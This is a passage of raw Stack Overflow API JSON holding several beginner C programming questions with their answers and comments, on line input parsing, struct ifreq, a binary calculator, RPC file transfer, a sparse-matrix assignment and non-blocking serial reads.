33119866, "question_id": 33119812, "link": "https://stackoverflow.com/questions/33119812/reading-a-specific-input-and-print-it-in-the-same-format/33119866#33119866", "title": "Reading a specific input and print it in the same format", "body": "<p>Simple answer is to not use <code>scanf</code> but to use <a href=\"http://en.cppreference.com/w/c/io/fgets\"><code>fgets</code></a> instead to read the whole lines.</p>\n\n<p>If you then need to use the separate values in the line, then you can use <code>sscanf</code> or <a href=\"http://en.cppreference.com/w/c/string/byte/strtok\"><code>strtok</code></a> to get them.</p>\n"}], "owner": {"reputation": 25, "user_id": 4191218, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2b6fd763eb32286212d0e72adaf8502?s=128&d=identicon&r=PG&f=1", "display_name": "Morde", "link": "https://stackoverflow.com/users/4191218/morde"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1444811111, "creation_date": 1444809642, "last_edit_date": 1444811111, "question_id": 33119812, "link": "https://stackoverflow.com/questions/33119812/reading-a-specific-input-and-print-it-in-the-same-format", "title": "Reading a specific input and print it in the same format", "body": "<p>I am quite newbie in programming and I want to print out a specific input format the exact way as shown below.</p>\n\n<pre><code>5 5\n1\n2 2 0 1\n</code></pre>\n\n<hr>\n\n<pre><code>5 5\n1\n2 2 0 1\n</code></pre>\n\n<p>The top part is the input parameters and the below part which is the same as well is the output. How do I format my <code>scanf</code> and <code>printf</code> to achieve this format? This is actually a 2D array problem but I believe for this part I would not need a 2D array yet? As for stage 1, I am just suppose to print out this format of inputs.</p>\n"}, {"tags": ["c++", "c", "linux", "network-programming"], "comments": [{"owner": {"reputation": 27011, "user_id": 1490355, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/296f0478cb1b6724e3f862ace601fa99?s=128&d=identicon&r=PG", "display_name": "SingerOfTheFall", "link": "https://stackoverflow.com/users/1490355/singerofthefall"}, "edited": false, "score": 1, "creation_date": 1444809734, "post_id": 33119803, "comment_id": 54052798, "body": "That page you linked is almost 2 years old..."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1444810260, "post_id": 33119803, "comment_id": 54053100, "body": "This structure is not mandated by POSIX, it&#39;s Linux specific. So if you want portability you can&#39;t really use it at all."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1444810373, "post_id": 33119803, "comment_id": 54053173, "body": "Also, if you look at e.g. <code>&#47;usr&#47;include&#47;net&#47;if.h</code> then you will see that all fields also have aliases by using preprocessing macros, so using just <code>my_ifreq_ptr-&gt;ifr_name</code> will automatically be replaced with <code>my_ifreq_ptr-&gt;ifr_ifrn.ifrn_name</code> by the preprocessor."}, {"owner": {"reputation": 13900, "user_id": 2020827, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/e6c7105ef9148e931ad05a6692155046?s=128&d=identicon&r=PG&f=1", "display_name": "sergej", "link": "https://stackoverflow.com/users/2020827/sergej"}, "edited": false, "score": 0, "creation_date": 1444810854, "post_id": 33119803, "comment_id": 54053425, "body": "See the git log to find out why this change was made."}, {"owner": {"reputation": 323, "user_id": 2346005, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f403bbc944d9c25326aca313f914154d?s=128&d=identicon&r=PG&f=1", "display_name": "anoop.babu", "link": "https://stackoverflow.com/users/2346005/anoop-babu"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444812931, "post_id": 33119803, "comment_id": 54054676, "body": "@JoachimPileborg, Thanks. I missed the #defines. I came across this confusion while debugging through gnu GDB. Since macros where not applicable in that state, I ran into errors. Now got it !!"}], "owner": {"reputation": 323, "user_id": 2346005, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f403bbc944d9c25326aca313f914154d?s=128&d=identicon&r=PG&f=1", "display_name": "anoop.babu", "link": "https://stackoverflow.com/users/2346005/anoop-babu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 16510, "favorite_count": 2, "answer_count": 0, "score": 7, "last_activity_date": 1444812801, "creation_date": 1444809623, "last_edit_date": 1444812801, "question_id": 33119803, "link": "https://stackoverflow.com/questions/33119803/struct-ifreq-different-definition-in-linux-if-h-and-man-page", "title": "struct ifreq : different definition in &quot;linux/if.h&quot; and man page", "body": "<p>In online manual page <a href=\"http://man7.org/linux/man-pages/man7/netdevice.7.html\" rel=\"noreferrer\">netdevice(7) - Linux man page</a>, the definition of ifreq structure is given as:</p>\n\n<pre><code>struct ifreq {\n               char ifr_name[IFNAMSIZ]; /* Interface name */\n               union {\n                   struct sockaddr ifr_addr;\n                   struct sockaddr ifr_dstaddr;\n                   struct sockaddr ifr_broadaddr;\n                   struct sockaddr ifr_netmask;\n                   struct sockaddr ifr_hwaddr;\n                   short           ifr_flags;\n                   int             ifr_ifindex;\n                   int             ifr_metric;\n                   int             ifr_mtu;\n                   struct ifmap    ifr_map;\n                   char            ifr_slave[IFNAMSIZ];\n                   char            ifr_newname[IFNAMSIZ];\n                   char           *ifr_data;\n               };\n           };\n</code></pre>\n\n<p>But my linux header shows different definition. Below is the definition from /usr/include/linux/if.h\nThe kernel version I'm using is Linux 3.18</p>\n\n<pre><code>struct ifreq {\n#define IFHWADDRLEN 6\n    union\n    {\n        char    ifrn_name[IFNAMSIZ];        /* if name, e.g. \"en0\" */\n    } ifr_ifrn;\n\n    union {\n        struct  sockaddr ifru_addr;\n        struct  sockaddr ifru_dstaddr;\n        struct  sockaddr ifru_broadaddr;\n        struct  sockaddr ifru_netmask;\n        struct  sockaddr ifru_hwaddr;\n        short   ifru_flags;\n        int ifru_ivalue;\n        int ifru_mtu;\n        struct  ifmap ifru_map;\n        char    ifru_slave[IFNAMSIZ];   /* Just fits the size */\n        char    ifru_newname[IFNAMSIZ];\n        void *  ifru_data;\n        struct  if_settings ifru_settings;\n    } ifr_ifru;\n};\n</code></pre>\n\n<p>Why is this change made ? Which one should I stick to for portability with different linux distros ?</p>\n"}, {"tags": ["c", "input", "binary"], "answers": [{"tags": [], "owner": {"reputation": 4270, "user_id": 2707359, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8754698c78ca3a082e1593688a9df99c?s=128&d=identicon&r=PG&f=1", "display_name": "Ilya", "link": "https://stackoverflow.com/users/2707359/ilya"}, "is_accepted": false, "score": 0, "last_activity_date": 1444812376, "last_edit_date": 1444812376, "creation_date": 1444810383, "answer_id": 33120027, "question_id": 33119503, "link": "https://stackoverflow.com/questions/33119503/multiple-different-type-inputs-in-one-line/33120027#33120027", "title": "Multiple different type inputs in one line", "body": "<p>You can read line of text (function <code>getline</code> or <code>gets_s</code>) and parse it (function <code>sscanf</code>). Try something like this:</p>\n\n<pre><code>char buffer[128];\nint nbParsedItems;\nprintf(\"Enter an expression using binary numbers or Q to quit: \");\ngets_s(buffer, 127);\nif (buffer[0] == 'q' || buffer[0] == 'Q')\n  return;\nnbParsedItems = sscanf(buffer, \" %s %c %s\", Binary1, &amp;op, Binary2);\nif (nbParsedItems == 3) /* in other cases you should ask user to enter request again */\n{\n  /* calculate */\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 8984, "user_id": 2485966, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dZj6A.jpg?s=128&g=1", "display_name": "Ruud Helderman", "link": "https://stackoverflow.com/users/2485966/ruud-helderman"}, "edited": false, "score": 1, "creation_date": 1444811198, "post_id": 33120084, "comment_id": 54053592, "body": "Please do not recommend people to use <code>gets</code>: <a href=\"http://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used\" title=\"why is the gets function so dangerous that it should not be used\">stackoverflow.com/questions/1694036/&hellip;</a>"}, {"owner": {"reputation": 4113, "user_id": 2126582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tVrzW.png?s=128&g=1", "display_name": "AnatolyS", "link": "https://stackoverflow.com/users/2126582/anatolys"}, "edited": false, "score": 0, "creation_date": 1444811278, "post_id": 33120084, "comment_id": 54053638, "body": "Ruud, in this case it does not matter"}, {"owner": {"reputation": 8984, "user_id": 2485966, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dZj6A.jpg?s=128&g=1", "display_name": "Ruud Helderman", "link": "https://stackoverflow.com/users/2485966/ruud-helderman"}, "edited": false, "score": 1, "creation_date": 1444813183, "post_id": 33120084, "comment_id": 54054845, "body": "Your answer, being on SO, has become an example for others to follow. It matters a lot."}], "tags": [], "owner": {"reputation": 4113, "user_id": 2126582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tVrzW.png?s=128&g=1", "display_name": "AnatolyS", "link": "https://stackoverflow.com/users/2126582/anatolys"}, "is_accepted": false, "score": 0, "last_activity_date": 1444811026, "last_edit_date": 1444811026, "creation_date": 1444810574, "answer_id": 33120084, "question_id": 33119503, "link": "https://stackoverflow.com/questions/33119503/multiple-different-type-inputs-in-one-line/33120084#33120084", "title": "Multiple different type inputs in one line", "body": "<p>Ctrl+C is standard way to terminate console program. But if you want to use 'q' as terminate signal, you can do the following: </p>\n\n<pre><code>char line[128];\nfloat a, b;\nchar op;\n\nwhile(true) {\n    printf(\"Enter an expression using binary numbers or q to quit: \");\n    if( gets(line) ) {\n        if( strcmp(line, \"q\") == 0 || strcmp(line, \"Q\") == 0 ) {\n            printf(\"See you later\");\n            break;\n        }\n        if( sscanf(line, \"%f %c %f\", &amp;a, &amp;op, &amp;b) != 3 ) {\n            printf(\"Error: wrong expression. Please try again\");\n            continue;\n        }\n        ...\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 16391, "user_id": 1658631, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wP8B0.jpg?s=128&g=1", "display_name": "Joe Watkins", "link": "https://stackoverflow.com/users/1658631/joe-watkins"}, "is_accepted": true, "score": 3, "last_activity_date": 1444812826, "last_edit_date": 1444812826, "creation_date": 1444810581, "answer_id": 33120088, "question_id": 33119503, "link": "https://stackoverflow.com/questions/33119503/multiple-different-type-inputs-in-one-line/33120088#33120088", "title": "Multiple different type inputs in one line", "body": "<p>Keep code as simple as possible, keep the minimum number of variables and functions required for functionality.</p>\n\n<p>Think carefully about each requirement of the program, treat them as individual small problems ...</p>\n\n<p>Like this ...</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define BUFLEN 32\n\ndouble convertToDouble(const char *chars) {\n    return strtod(chars, NULL);\n}\n\ndouble calculateAnswer(double left, char operator, double right) {\n    switch (operator) {\n        case '&lt;': return left &lt; right; break;\n        case '&gt;': return left &gt; right; break;\n        case '=': return left == right; break;\n        case '*': return left * right; break;\n        case '/': return left / right; break;\n    }\n\n    /* do something */\n    return -1;\n}\n\nint main(int argc, char *argv[]) {\n    char buffer[BUFLEN*2];\n\n    printf(\"Enter an expression using binary numbers or Q to quit: \");  \n\n    while (fgets(buffer, BUFLEN, stdin)) {\n        char left[BUFLEN] = {0},\n              right[BUFLEN] = {0},\n              operator = 0;\n\n        if(sscanf(buffer, \"%s %c %s\\n\", left, &amp;operator, right)) {\n            if (!operator) {\n                if (left[0] == 'q' || left[0] == 'Q') {\n                    printf(\"Bye!\\n\");\n                    break;\n                }\n            }\n\n            printf(\"%s %c %s = %f\\n\", \n                left, operator, right, \n                calculateAnswer(\n                    convertToDouble(left), \n                    operator,\n                    convertToDouble(right)));\n        } else {\n            /* do something */\n        }\n\n        printf(\"Enter an expression using binary numbers or Q to quit: \");\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Note that, this code is not meant to be correct, it's an approximation of the requirements you describe without putting in too much effort. </p>\n\n<p>Much more importantly, it's easy to understand.</p>\n"}], "owner": {"reputation": 61, "user_id": 4317738, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9d21a8b3e2d36849126dc19a2e5bcef0?s=128&d=identicon&r=PG&f=1", "display_name": "Cast", "link": "https://stackoverflow.com/users/4317738/cast"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 122, "favorite_count": 0, "accepted_answer_id": 33120088, "answer_count": 3, "score": 1, "last_activity_date": 1444812826, "creation_date": 1444808658, "last_edit_date": 1444810160, "question_id": 33119503, "link": "https://stackoverflow.com/questions/33119503/multiple-different-type-inputs-in-one-line", "title": "Multiple different type inputs in one line", "body": "<p>I'm trying to make a binary calculator that terminates the the program when <code>q</code> is entered. As a result I made a variable called <code>quit</code> to act as the flag <code>q</code> is entered. However when I made the <code>scanf</code> for the variable <code>q</code> it seems to take away split the inputs up when <code>q</code> is not pressed. for example, if I  enter <code>110 + 110</code> I get:</p>\n\n<pre><code>110 + 110 = 1000\n</code></pre>\n\n<p>as if it's doing <code>10 + 110</code>.</p>\n\n<p>The input has to be all in one line. The format of the input is always going to be: </p>\n\n<blockquote>\n  <p>Operand operator Operand</p>\n</blockquote>\n\n<p>Which is why I have the: </p>\n\n<pre><code>scanf(\" %s %c %s\",Binary1, &amp;op, Binary2);\n</code></pre>\n\n<p>on my code. However if the user input is just <code>q</code> or <code>Q</code> it terminates the program.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdlib.h&gt;\n\ndouble convertDouble(char Bin []);\ndouble convertBinary(double theAns);\ndouble calculate(double num1,double num2,char op);\nmain(void) {\n    char op;\n    float num1,num2;\n    char quit;\n    double n1,n2,ans;\n    double binAns;\n    char Binary1[20];\n    char Binary2[20];\n    char Input[100];\n    char myChar;\n    int i = 0;\n // quit = 'k';\n    while (quit != 'q'){\n\n      printf(\"Enter an expression using binary numbers or Q to quit: \"); \n   // scanf(\"%s\", &amp;quit);\n    if(quit == 'q' ){\n      exit(EXIT_SUCCESS);\n    }else{\n\n    }\n    scanf(\" %s %c %s\",Binary1, &amp;op, Binary2);\n /* while(Binary1[i] &gt; 49 || Binary2[i] &gt; 49){\n\n         if(Binary1[i] &gt;= 'q' || Binary1[i]&lt;= 'Q' ){\n             exit(0);\n             quit = 'q';\n         }else{\n             printf(\"please enter binary: \"); \n             scanf(\"%s %c %s\\n\",&amp;Binary1, &amp;op, &amp;Binary2);\n         }\n         i++;\n     } */\n // quit[0] = Binary1[0];\n    printf(\"quit = %c\\n\", quit);\n    printf(\"Binary1 =%s\\n\", Binary1);\n    printf(\"op =%c\\n\", op);\n    printf(\"Binary2 =%s\\n\", Binary2);\n    n1 = convertDouble(Binary1);\n    n2 = convertDouble(Binary2);\n    ans = calculate(n1,n2,op);\n    binAns = convertBinary(ans);\n\n//  printf(\"value of n1 = %f\\n\", n1);\n//  printf(\"value of n2 = %f\\n\", n2);\n//  printf(\"value of binAns = %f\\n\", binAns);\n//  printf(\"ans = %f\", ans);\n\n    printf(\" = %f\\n\",binAns);\n  } // end of while\n\n    printf(\"quit = %c\\n\", quit);\n    printf(\"Binary1 =%s\\n\", Binary1);\n    printf(\"op =%c\\n\", op);\n    printf(\"Binary2 =%s\\n\", Binary2);\n    printf(\"quit\");\n    exit(EXIT_SUCCESS);\n}\n</code></pre>\n\n<h2>Note:</h2>\n\n<p>More info about my program: the reason why I have the input binaries as strings was because it needs to convert them to a <code>double</code>. It does this in a different function called <code>convertDouble</code> which is not pasted here. It calculates the answer in the function calculate(also not pasted). The answer is converted to a binary in the <code>convertBinary</code> function and then is displayed.</p>\n\n<p><strong>Example of How it's supposed to run</strong></p>\n\n<pre><code>Enter an expression using binary numbers or Q to quit: 1101.001 * 101.1101\n= 1001100.0100101\nEnter an expression using binary numbers or Q to quit: 0.0000000001 * 0.0000000001\n= 0.00000000000000000001\nEnter an expression using binary numbers or Q to quit: 0.111 * 1000.0\n= 111.0\nEnter an expression using binary numbers or Q to quit: 11.0 * 11.0\n= 1001.0\nEnter an expression using binary numbers or Q to quit: 11.11 + 11.11\n= 111.1\nEnter an expression using binary numbers or Q to quit: 101.1 / 10.0\n= 10.11\nEnter an expression using binary numbers or Q to quit: 1001.11 - 11.01\n= 110.1\nEnter an expression using binary numbers or Q to quit: q\n</code></pre>\n"}, {"tags": ["c", "rpc", "large-files"], "comments": [{"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1444818145, "post_id": 33118970, "comment_id": 54058195, "body": "Don&#39;t try to store the entire file in memory. Read and send it chunk by chunk. A good chunk size would be 1-64 kb."}, {"owner": {"reputation": 489, "user_id": 5080218, "user_type": "registered", "accept_rate": 46, "profile_image": "https://lh5.googleusercontent.com/-hl9DciHvarU/AAAAAAAAAAI/AAAAAAAAAFI/_yP7TgqK4T8/photo.jpg?sz=128", "display_name": "Stefano Sandon&#224;", "link": "https://stackoverflow.com/users/5080218/stefano-sandon%c3%a0"}, "reply_to_user": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1444826931, "post_id": 33118970, "comment_id": 54063818, "body": "Thanks for the suggestion, But How can I do that using RPC? I have to pass a struct to the remote procedure."}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1444829152, "post_id": 33118970, "comment_id": 54065385, "body": "I don&#39;t think RPC is the right tool for sending huge messages."}], "owner": {"reputation": 489, "user_id": 5080218, "user_type": "registered", "accept_rate": 46, "profile_image": "https://lh5.googleusercontent.com/-hl9DciHvarU/AAAAAAAAAAI/AAAAAAAAAFI/_yP7TgqK4T8/photo.jpg?sz=128", "display_name": "Stefano Sandon&#224;", "link": "https://stackoverflow.com/users/5080218/stefano-sandon%c3%a0"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 958, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1444807028, "creation_date": 1444807028, "question_id": 33118970, "link": "https://stackoverflow.com/questions/33118970/send-huge-file-through-rpc", "title": "Send huge file through RPC", "body": "<p>I'm developing an application client-server to send files using RPC but I have some problems on sending large file. I would like to allow the sender (client) to upload file of any dimension. My initial intention was to create on client side a struct containing the file (as a big string), the name of the file and the size, and then to send this to the server. This is the .x file:</p>\n\n<p>fileA.x</p>\n\n<pre><code>const MAXLEN = 1024;\nconst FILELEN = 1000000000;\ntypedef string my_file&lt;FILELEN&gt;;\n\ntypedef char filename[MAXLEN];\n\nstruct file_to_send {\n filename name;\n my_file data;\n int size;\n};\n\nprogram FILE_PROG {\n  version FILE_VER {\n    int sendFile(my_file) = 1;\n  } = 1;\n} = 0x20000011;\n</code></pre>\n\n<p>The problem is that sending this struct (also imposing the limit of size FILELEN), I'm not able to send more than 106KB. How could I send any dimension of file? If a user send to the server 16GB of data, the problem could be the loading of the file on the struct and, on the server side,  the storing of the string on a file. For the first action I need to read the file and store it on a string, and for the second I need to read the string and store it on a file. I think there could be problems of memory. How could I avoid this?</p>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 501, "user_id": 5349798, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3eea4b944c489813694d8ce3da3720e2?s=128&d=identicon&r=PG&f=1", "display_name": "renonsz", "link": "https://stackoverflow.com/users/5349798/renonsz"}, "is_accepted": true, "score": 0, "last_activity_date": 1444809007, "creation_date": 1444809007, "answer_id": 33119608, "question_id": 33118849, "link": "https://stackoverflow.com/questions/33118849/sparse-matrix-function/33119608#33119608", "title": "Sparse Matrix Function", "body": "<p>Error handling is intended to be performed via return values. Void could be for instance the print function when expecting no errors at all. Reading function and other operations should check the input: e. g. matrices are of according dimensions, or other problems may arise and outcome will not match expectations.</p>\n\n<pre><code>int SMTX_read (SMatrixType A)\n{\n    int err = 0;\n    /* reading input */\n    if( outcome != expected ) { err = SMTX_ERROR; }\n    /* .. */\n    return err;\n}\n</code></pre>\n\n<p>Or an other example:</p>\n\n<pre><code>int division( int dividend, int divisor, int * quotient_ptr )\n{\n    int err = -1;\n    if( 0 != divisor ) { err = 0; *quotient_ptr = dividend / divisor; }\n    return err;\n}\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 5443428, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a9c6d975565e4a3b712f100ff53cde?s=128&d=identicon&r=PG&f=1", "display_name": "Zjh", "link": "https://stackoverflow.com/users/5443428/zjh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 33119608, "answer_count": 1, "score": -3, "last_activity_date": 1444809007, "creation_date": 1444806671, "last_edit_date": 1592644375, "question_id": 33118849, "link": "https://stackoverflow.com/questions/33118849/sparse-matrix-function", "title": "Sparse Matrix Function", "body": "<p>This is my homework. I can return void, but I don't know how to use <code>int</code> and how to examine when something goes wrong and returns <code>-1;</code></p>\n<p>\ufffcADT SMatrix is:</p>\n<ol>\n<li><p>Heading</p>\n<p>Sparse Matrix (with dimension rows x cols) of integers.</p>\n</li>\n</ol>\n<h2></h2>\n<p>Functions:</p>\n<pre><code>int SMTX_read (SMatrixType A)\n\n::= read in a matrix from stdin and stores the matrix in A.\n::= returns SMTX_ERROR if something went wrong\n--------/* For this project, the input format will be\nLine 1: two integers, rows &amp; cols, dimension of the matrix Line 2 to rows+1: contains cols number of integers\nShould take the input and convert to your proper ADT format */\n\n\nint SMTX_print(SMatrixType A)\n\n::= print the sparse matrix A in the following format\n/* Line 1: print \u201cRows = ??, Cols = ??, # of non-zero entries = ??\u201d Line 2 ~ ??: print \u201c&lt; Ri, Ci, entry-value&gt;,\u201d one 3-tuple per line */\n\n\n\nint SMTX_add (SMatrixType A, B, C)\n\n::= C &lt;= A + B\n::= returns SMTX_ERROR if something went wrong\n\nint SMTX_subtract (SMatrixType A, B, C)\n\n::= C &lt;= A - B\n::= returns SMTX_ERROR if something went wrong\n\nint SMTX_transpose (SMatrixType A, B) ::= B &lt;= AT\n\n::= returns SMTX_ERROR if something went wrong\n\nint SMTX_multiply (SMatrixType A, B, C)\n\n\n\n ::= C &lt;= A x B\n    ::= returns SMTX_ERROR if something went wrong /* please use the quick \n\nalgorithm given in lecture */\n</code></pre>\n<p>Data typing:</p>\n<pre><code>define SMTX_ERROR -1\ndefine MAX_SMTX_SIZE 100\ntypedef struct SMatrix {\n. ..\n} SMatrixType\n</code></pre>\n"}, {"tags": ["c", "usbserial"], "answers": [{"comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444808893, "post_id": 33119064, "comment_id": 54052340, "body": "AKA &#39;I set it to non-blocking and was surprised when it did not block&#39; :)"}, {"owner": {"reputation": 29, "user_id": 3523592, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/100001711366132/picture?type=large", "display_name": "Abhishek Parikh", "link": "https://stackoverflow.com/users/3523592/abhishek-parikh"}, "edited": false, "score": 0, "creation_date": 1444811255, "post_id": 33119064, "comment_id": 54053623, "body": "It is showing  error: continue statement not within a loop"}, {"owner": {"reputation": 29, "user_id": 3523592, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/100001711366132/picture?type=large", "display_name": "Abhishek Parikh", "link": "https://stackoverflow.com/users/3523592/abhishek-parikh"}, "edited": false, "score": 0, "creation_date": 1444812928, "post_id": 33119064, "comment_id": 54054672, "body": "if (n==0) { break; } else if (n == EAGAIN || n == EWOULDBLOCK){ continue; } else if (n&gt;0) { printf(&quot;Response %s&quot;,response); } else { printf(&quot;Error reading %d %s&quot;,errno,\tstrerror(errno)); }"}, {"owner": {"reputation": 29, "user_id": 3523592, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/100001711366132/picture?type=large", "display_name": "Abhishek Parikh", "link": "https://stackoverflow.com/users/3523592/abhishek-parikh"}, "edited": false, "score": 0, "creation_date": 1444813357, "post_id": 33119064, "comment_id": 54054970, "body": "No.. Should i remove it??"}, {"owner": {"reputation": 2149, "user_id": 2096401, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uVjii.jpg?s=128&g=1", "display_name": "TripeHound", "link": "https://stackoverflow.com/users/2096401/tripehound"}, "reply_to_user": {"reputation": 29, "user_id": 3523592, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/100001711366132/picture?type=large", "display_name": "Abhishek Parikh", "link": "https://stackoverflow.com/users/3523592/abhishek-parikh"}, "edited": false, "score": 0, "creation_date": 1444817297, "post_id": 33119064, "comment_id": 54057607, "body": "@AbhishekParikh  No, keep the loop... Dave&#39;s code <i>replaces</i> the inside of the loop."}], "tags": [], "owner": {"reputation": 4426, "user_id": 450609, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6708bd9ccabfcb1cf6863fb32f32d1de?s=128&d=identicon&r=PG", "display_name": "dave", "link": "https://stackoverflow.com/users/450609/dave"}, "is_accepted": false, "score": 0, "last_activity_date": 1444807311, "creation_date": 1444807311, "answer_id": 33119064, "question_id": 33118816, "link": "https://stackoverflow.com/questions/33118816/error-errno-11-resource-temporarily-unavailable/33119064#33119064", "title": "Error errno 11 Resource temporarily unavailable", "body": "<p>You are getting the error code <code>EAGAIN</code> from your <code>read</code> call and this is causing you to exit your loop and print out the error.  Of course <code>EAGAIN</code> means that this was a temporary problem (e.g. there wasn't anything to read at the time you tried to read it, perhaps you'd like to try later?).</p>\n\n<p>You could restructure the read to be similar to:</p>\n\n<pre><code>n = read(USB, &amp;buf, 1)\nif (n == 0) {\n    break;\n} else if (n &gt; 0) {\n    response[spot1++] = buf;\n} else if (n == EAGAIN || n == EWOULDBLOCK)\n    continue;\n} else { /*unrecoverable error */\n    perror(\"Error reading\");\n    break;\n}\n</code></pre>\n\n<p>You could improve your code by making <code>buf</code> be an array and reading more than one character at a time.  Also notice that <code>sprintf</code> was unnecessary, you can just copy the character(s) in to the array.</p>\n"}], "owner": {"reputation": 29, "user_id": 3523592, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/100001711366132/picture?type=large", "display_name": "Abhishek Parikh", "link": "https://stackoverflow.com/users/3523592/abhishek-parikh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 6231, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1444807311, "creation_date": 1444806588, "question_id": 33118816, "link": "https://stackoverflow.com/questions/33118816/error-errno-11-resource-temporarily-unavailable", "title": "Error errno 11 Resource temporarily unavailable", "body": "<p>I am using USB to Uart converter for transmission and reception for my data.\nHere is my code for transmission </p>\n\n<pre><code>void main()\n{\nint USB = open( \"/dev/ttyUSB0\", O_RDWR | O_NONBLOCK | O_NDELAY);        \nstruct termios tty;\nstruct termios tty_old;\nmemset (&amp;tty, 0, sizeof tty);\n\n/* Set Baud Rate */\ncfsetospeed (&amp;tty, (speed_t)B9600);\ncfsetispeed (&amp;tty, (speed_t)B9600);\n\n/* Setting other Port Stuff */\ntty.c_cflag     &amp;=  ~PARENB;            // Make 8n1\ntty.c_cflag     &amp;=  ~CSTOPB;\ntty.c_cflag     &amp;=  ~CSIZE;\ntty.c_cflag     |=  CS8;\n\ntty.c_cflag     &amp;=  ~CRTSCTS;           // no flow control\ntty.c_cc[VMIN]   =  1;                  // read doesn't block\ntty.c_cc[VTIME]  =  5;                  // 0.5 seconds read timeout\ntty.c_cflag     |=  CREAD | CLOCAL;     // turn on READ &amp; ignore ctrl lines\n\n/* Make raw */\ncfmakeraw(&amp;tty);\n\n/* Flush Port, then applies attributes */\ntcflush( USB, TCIFLUSH );\n\n/*  WRITE */   \nunsigned char cmd[] = \"YES this program is writing \\r\";\nint n_written = 0,spot = 0;\ndo {\nn_written = write( USB, &amp;cmd[spot], 1 );\nspot += n_written;\n} while (cmd[spot-1] != '\\r' &amp;&amp; n_written &gt; 0);\n</code></pre>\n\n<p>The output of my code is same as expacted</p>\n\n<pre><code>YES this program is writing \n</code></pre>\n\n<p>Now this is my code for reading from UART </p>\n\n<pre><code>/* READ   */\nint n = 0,spot1 =0;\nchar buf = '\\0';\n\n/* Whole response*/\nchar response[1024];\nmemset(response, '\\0', sizeof response);\n\ndo {\nn = read( USB, &amp;buf, 1 );\nsprintf( 